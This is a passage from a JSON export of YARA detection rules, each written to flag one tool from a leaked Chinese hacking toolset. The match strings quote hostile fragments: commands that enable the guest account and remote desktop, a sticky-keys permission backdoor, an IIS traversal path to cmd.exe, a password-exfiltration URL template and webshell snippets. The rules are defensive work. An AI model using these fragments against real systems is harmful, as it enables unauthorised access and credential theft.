Toolset","required_modules":[],"rule_hash":"97a31a7acfad1aa61155be30274ebe9f","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_GetHashes_2_RID2ED4 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetHashes.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:31:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetHashes.exe <SAM registry file> [System key file]\" fullword ascii\n      $s2 = \"GetHashes.exe $Local\" fullword ascii\n      $s3 = \"The system key doesn't match SAM registry file!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them\n}","date":"2015-06-23 11:31:11","description":"Sample from CN Honker Pentest Toolset - file GetHashes.exe","minimum_yara":"1.7","name":"CN_Honker_GetHashes_2_RID2ED4","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"4755daad11cb1caa9bda85a66aaf965e","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Generic_KeyGen_Patcher_RID2F96 : DEMO EXE FILE GEN HKTL {\n   meta:\n      description = \"Keygen from CN Honker Pentest Toolset - file Acunetix_Web_Vulnerability_Scanner_8.x_Enterprise_Edition_KeyGen.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:03:31\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<description>Patch</description>\" fullword ascii\n      $s2 = \"\\\\dup2patcher.dll\" fullword ascii\n      $s3 = \"load_patcher\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them\n}","date":"2015-06-23 12:03:31","description":"Keygen from CN Honker Pentest Toolset - file Acunetix_Web_Vulnerability_Scanner_8.x_Enterprise_Edition_KeyGen.exe","minimum_yara":"1.7","name":"Generic_KeyGen_Patcher_RID2F96","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"33943f1f75ac0f452de5dacd926b9136","score":50,"tags":["DEMO","EXE","GEN","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_net_packet_capt_RID30EC : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file net_packet_capt.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:00:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"(*.sfd)\" fullword ascii\n      $s2 = \"GetLaBA\" fullword ascii\n      $s3 = \"GAIsProcessorFeature\" fullword ascii\n      $s4 = \"- Gablto \" ascii\n      $s5 = \"PaneWyedit\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them\n}","date":"2015-06-23 13:00:31","description":"Sample from CN Honker Pentest Toolset - file net_packet_capt.exe","minimum_yara":"1.7","name":"CN_Honker_net_packet_capt_RID30EC","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a98c295ee39f1d4c3fd6f58063c7db61","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_HASH_pwhash_RID2ED5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file pwhash.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:31:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Example: quarks-pwdump.exe --dump-hash-domain --with-history\" fullword ascii\n      $s2 = \"quarks-pwdump.exe <options> <NTDS file>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them\n}","date":"2015-06-23 11:31:21","description":"Sample from CN Honker Pentest Toolset - file pwhash.exe","minimum_yara":"1.7","name":"CN_Honker_HASH_pwhash_RID2ED5","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f57fad9853b222ff63d75cc6b7987495","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_SqlMap_Python_Run_RID318A : DEMO EXE FILE HKTL SCRIPT {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Run.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:26:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".\\\\Run.log\" fullword ascii\n      $s2 = \"[root@Hacker~]# Sqlmap \" fullword ascii\n      $s3 = \"%sSqlmap %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them\n}","date":"2015-06-23 13:26:51","description":"Sample from CN Honker Pentest Toolset - file Run.exe","minimum_yara":"1.7","name":"CN_Honker_SqlMap_Python_Run_RID318A","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"13f071e1e6d6f638a71bf996a45084c6","score":70,"tags":["DEMO","EXE","SCRIPT","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_WebScan_wwwscan_RID30D3 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file wwwscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:56:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s www.target.com -p 8080 -m 10 -t 16\" fullword ascii\n      $s2 = \"GET /nothisexistpage.html HTTP/1.1\" fullword ascii\n      $s3 = \"<Usage>:  %s <HostName|Ip> [Options]\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}","date":"2015-06-23 12:56:21","description":"Sample from CN Honker Pentest Toolset - file wwwscan.exe","minimum_yara":"1.7","name":"CN_Honker_WebScan_wwwscan_RID30D3","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"3aefdc951cd3da15997b74de60c1e6bf","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_sig_3389_2_3389_RID2F07 : DEMO EXE FILE HKTL T1087 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file 3389.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:39:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1087\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Documents and Settings\\\\Administrator\\\\\" fullword ascii\n      $s2 = \"net user guest /active:yes\" fullword ascii\n      $s3 = \"\\\\Microsoft Word.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them\n}","date":"2015-06-23 11:39:41","description":"Sample from CN Honker Pentest Toolset - file 3389.exe","minimum_yara":"1.7","name":"CN_Honker_sig_3389_2_3389_RID2F07","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a2d508cab567356683739635427f1504","score":70,"tags":["DEMO","EXE","T1087","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_PHP_php11_RID2DB8 : DEMO HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file php11.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<tr><td><b><?php if (!$win) {echo wordwrap(myshellexec('id'),90,'<br>',1);} else\" ascii\n      $s2 = \"foreach (glob($_GET['pathtomass'].\\\"/*.htm\\\") as $injectj00) {\" fullword ascii\n      $s3 = \"echo '[cPanel Found] '.$login.':'.$pass.\\\"  Success\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 800KB and all of them\n}","date":"2015-06-23 10:43:51","description":"Sample from CN Honker Pentest Toolset - file php11.txt","minimum_yara":"1.7","name":"CN_Honker_PHP_php11_RID2DB8","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"4b8bc6d91639ca05aeacacd3fb1d48d9","score":70,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_WebCruiserWVS_RID2FC2 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file WebCruiserWVS.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:10:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"id:uid:user:username:password:access:account:accounts:admin_id:admin_name:admin_\" ascii\n      $s1 = \"Created By WebCruiser - Web Vulnerability Scanner http://sec4app.com\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}","date":"2015-06-23 12:10:51","description":"Sample from CN Honker Pentest Toolset - file WebCruiserWVS.exe","minimum_yara":"1.7","name":"CN_Honker_WebCruiserWVS_RID2FC2","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f70fbef149ea29ec3ba1d8d15c1c0806","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Hookmsgina_RID2ED7 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Hookmsgina.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\pipe\\\\WinlogonHack\" fullword ascii\n      $s2 = \"%s?host=%s&domain=%s&user=%s&pass=%s&port=%u\" fullword ascii\n      $s3 = \"Global\\\\WinlogonHack_Load%u\" fullword ascii\n      $s4 = \"Hookmsgina.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-23 11:31:41","description":"Sample from CN Honker Pentest Toolset - file Hookmsgina.dll","minimum_yara":"1.7","name":"CN_Honker_Hookmsgina_RID2ED7","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"da7c330671f33f9c211d8bfc559706b8","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_sig_3389_xp3389_RID2F5E : DEMO EXE FILE HKTL T1050 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file xp3389.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:54:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"fdenytsconnections\\\"=dword:00000000 >> c:\\\\reg.reg\" fullword ascii\n      $s2 = \"echo [HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server] >\" ascii\n      $s3 = \"echo \\\"Tsenabled\\\"=dword:00000001 >> c:\\\\reg.reg\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them\n}","date":"2015-06-23 11:54:11","description":"Sample from CN Honker Pentest Toolset - file xp3389.exe","minimum_yara":"1.7","name":"CN_Honker_sig_3389_xp3389_RID2F5E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f5827f3836f600caad3858c61cc09b62","score":70,"tags":["DEMO","EXE","T1050","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_CookiesView_RID2F2F : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CookiesView.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:46:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"V1.0  Http://www.darkst.com Code:New4\" fullword ascii\n      $s1 = \"maotpo@126.com\" fullword ascii\n      $s2 = \"www.baidu.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 640KB and all of them\n}","date":"2015-06-23 11:46:21","description":"Sample from CN Honker Pentest Toolset - file CookiesView.exe","minimum_yara":"1.7","name":"CN_Honker_CookiesView_RID2F2F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"33813419c8cd14cfda1914650e0c6748","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_T00ls_Lpk_Sethc_v4_LPK_RID3285 : DEMO EXE FILE HKTL T1015 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file LPK.DAT\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:08:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1015\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://127.0.0.1/1.exe\" fullword wide\n      $s2 = \"FreeHostKillexe.exe\" fullword ascii\n      $s3 = \"\\\\sethc.exe /G everyone:F\" fullword ascii\n      $s4 = \"c:\\\\1.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them\n}","date":"2015-06-23 14:08:41","description":"Sample from CN Honker Pentest Toolset - file LPK.DAT","minimum_yara":"1.7","name":"CN_Honker_T00ls_Lpk_Sethc_v4_LPK_RID3285","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"49be95e0441b40be0fb356744bc7f2be","score":70,"tags":["DEMO","EXE","T1015","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_ScanHistory_RID2F3E : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ScanHistory.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:48:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ScanHistory.exe\" fullword wide\n      $s2 = \".\\\\Report.dat\" fullword wide\n      $s3 = \"select  * from  Results order by scandate desc\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-23 11:48:51","description":"Sample from CN Honker Pentest Toolset - file ScanHistory.exe","minimum_yara":"1.7","name":"CN_Honker_ScanHistory_RID2F3E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"d705b3bc1cff610d9a5617ba79395551","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_InvasionErasor_RID307A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file InvasionErasor.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:41:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\windows\\\\system32\\\\config\\\\*.*\" fullword wide\n      $s2 = \"c:\\\\winnt\\\\*.txt\" fullword wide\n      $s3 = \"Command1\" fullword ascii\n      $s4 = \"Win2003\" fullword ascii\n      $s5 = \"Win 2000\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}","date":"2015-06-23 12:41:31","description":"Sample from CN Honker Pentest Toolset - file InvasionErasor.exe","minimum_yara":"1.7","name":"CN_Honker_InvasionErasor_RID307A","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a69cf82c9dce437aaa742a15b7d1a86e","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_super_Injection1_RID3129 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file super Injection1.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:10:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Invalid owner=This control requires version 4.70 or greater of COMCTL32.DLL\" fullword wide\n      $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n      $s4 = \"ScanInject.log\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}","date":"2015-06-23 13:10:41","description":"Sample from CN Honker Pentest Toolset - file super Injection1.exe","minimum_yara":"1.7","name":"CN_Honker_super_Injection1_RID3129","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5962cfaad69bb42c5073db5b22e40f98","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Pk_Pker_RID2D73 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Pker.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:32:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/msadc/..%5c..%5c..%5c..%5cwinnt/system32/cmd.exe\" fullword wide\n      $s2 = \"msadc/..\\\\..\\\\..\\\\..\\\\winnt/system32/cmd.exe\" fullword wide\n      $s3 = \"--Made by VerKey&Only_Guest&Bincker\" fullword wide\n      $s4 = \";APPLET;EMBED;FRAMESET;HEAD;NOFRAMES;NOSCRIPT;OBJECT;SCRIPT;STYLE;\" fullword wide\n      $s5 = \" --Welcome to Www.Pker.In Made by V.K\" fullword wide\n      $s6 = \"Report.dat\" fullword wide\n      $s7 = \".\\\\Report.dat\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 5 of them\n}","date":"2015-06-23 10:32:21","description":"Sample from CN Honker Pentest Toolset - file Pker.exe","minimum_yara":"1.7","name":"CN_Honker_Pk_Pker_RID2D73","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"37998c302f50eb27ec8a4543a5fde53e","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_GetPass_GetPass_RID3094 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file GetPass.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:45:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\only\\\\Desktop\\\\\" ascii\n      $s2 = \"To Run As Administuor\" ascii\n      $s3 = \"Key to EXIT ... & pause > nul\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-23 12:45:51","description":"Sample from CN Honker Pentest Toolset - file GetPass.exe","minimum_yara":"1.7","name":"CN_Honker_GetPass_GetPass_RID3094","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"298b250f6e3588957d93f92d461abae0","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_F4ck_Team_F4ck_3_RID302E : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file F4ck_3.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:28:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"F4ck.exe\" fullword wide\n      $s2 = \"@Netapi32.dll\" fullword ascii\n      $s3 = \"Team.F4ck.Net\" fullword wide\n      $s6 = \"NO Net Add User\" fullword wide\n      $s7 = \"DLL ERROR\" fullword ascii\n      $s11 = \"F4ck Team\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them\n}","date":"2015-06-23 12:28:51","description":"Sample from CN Honker Pentest Toolset - file F4ck_3.exe","minimum_yara":"1.7","name":"CN_Honker_F4ck_Team_F4ck_3_RID302E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"adc11db30010802e079cce7816c7c296","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_ACCESS_brute_RID2EFA : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ACCESS_brute.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:37:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".dns166.co\" ascii\n      $s2 = \"SExecuteA\" ascii\n      $s3 = \"ality/clsCom\" ascii\n      $s4 = \"NT_SINK_AddRef\" ascii\n      $s5 = \"WINDOWS\\\\Syswm\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them\n}","date":"2015-06-23 11:37:31","description":"Sample from CN Honker Pentest Toolset - file ACCESS_brute.exe","minimum_yara":"1.7","name":"CN_Honker_ACCESS_brute_RID2EFA","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"0ba83ecd051bd8ac80cb4558062fd3be","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Fpipe_FPipe_RID2EEE : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file FPipe.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:35:31\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Unable to create TCP listen socket. %s%d\" fullword ascii\n      $s2 = \"http://www.foundstone.com\" fullword ascii\n      $s3 = \"%s %s port %d. Address is already in use\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them\n}","date":"2015-06-23 11:35:31","description":"Sample from CN Honker Pentest Toolset - file FPipe.exe","minimum_yara":"1.7","name":"CN_Honker_Fpipe_FPipe_RID2EEE","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5a2b53dad5c0be22c1d9e908d23a053f","score":50,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Layer_Layer_RID2F20 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Layer.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\Layer.pdb\" fullword ascii\n      $s2 = \"Layer.exe\" fullword wide\n      $s3 = \"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-23 11:43:51","description":"Sample from CN Honker Pentest Toolset - file Layer.exe","minimum_yara":"1.7","name":"CN_Honker_Layer_Layer_RID2F20","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"ac46b7991324278c02444bb41184c251","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_HTran2_4_RID2D69 : DEMO EXE FILE HKTL T1020 T1090 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file HTran2.4.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:30:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:\" fullword ascii\n      $s2 = \"[+] New connection %s:%d !!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them\n}","date":"2015-06-23 10:30:41","description":"Sample from CN Honker Pentest Toolset - file HTran2.4.exe","minimum_yara":"1.7","name":"CN_Honker_HTran2_4_RID2D69","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"485c7ba9360ac853fb6342e1fc26f7bd","score":70,"tags":["T1090","DEMO","FILE","T1020","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_SkinHRootkit_SkinH_RID31CC : DEMO EXE FILE HKTL T1014 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SkinH.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:37:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1014\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"(C)360.cn Inc.All Rights Reserved.\" fullword wide\n      $s1 = \"SDVersion.dll\" fullword wide\n      $s2 = \"skinh.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}","date":"2015-06-23 13:37:51","description":"Sample from CN Honker Pentest Toolset - file SkinH.exe","minimum_yara":"1.7","name":"CN_Honker_SkinHRootkit_SkinH_RID31CC","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"eeddc2d7068b723067314c57bd3501b4","score":70,"tags":["DEMO","EXE","T1014","FILE","HKTL"]},{"author":"Florian Roth","content":"rule 